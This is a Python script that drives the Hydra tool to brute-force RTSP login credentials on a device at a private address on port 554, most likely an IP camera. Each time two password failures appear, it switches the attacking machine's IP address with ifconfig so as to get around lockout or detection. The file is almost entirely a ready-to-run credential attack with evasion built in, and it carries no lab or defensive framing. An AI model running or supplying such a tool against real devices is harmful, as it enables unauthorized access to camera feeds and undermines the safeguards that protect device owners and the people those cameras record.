import subprocess
import time

# Target details
target_ip = "192.168.12.162"
port = "554"
user_list = "usernamelist.txt"
pass_list = "passwordlist.txt"
interface = "wlan0"

# IP rotation list
ip_list = ["192.168.12.100", "192.168.12.101", "192.168.12.102"]
ip_index = 0

# Hydra command template
hydra_cmd = f"hydra -L {user_list} -P {pass_list} rtsp://{target_ip}:{port} -s {port} -V -t 1 -w 10 -F"

print("Starting Hydra RTSP brute-force...\n")

fail_count = 0

try:
    proc = subprocess.Popen(hydra_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    for line in proc.stdout:
        print(line.strip())

        if "invalid password" in line.lower() or "incorrect password" in line.lower():
            fail_count += 1

        if fail_count >= 2:
            print("[*] Too many failures, switching IP...")

            # Pick next IP
            ip_index = (ip_index + 1) % len(ip_list)
            new_ip = ip_list[ip_index]

            # Change IP
            subprocess.run(f"sudo ifconfig {interface} {new_ip} netmask 255.255.255.0 up", shell=True)
            print(f"[*] IP changed to: {new_ip}")

            fail_count = 0
            time.sleep(5)

    proc.wait()

except Exception as err:
    print(f"[!] Error: {err}")
